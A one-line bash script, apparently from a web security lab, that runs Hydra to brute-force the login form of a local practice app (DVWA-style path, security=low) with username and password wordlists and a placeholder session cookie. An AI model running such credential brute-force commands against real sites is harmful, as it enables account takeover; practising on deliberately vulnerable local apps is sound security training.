#!/bin/bash

hydra -d -L users.txt -P passwords.txt 127.0.0.1 -s 4280 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=SESSION-ID-HERE;security=low:F=Username and/or password incorrect" -o results.txt
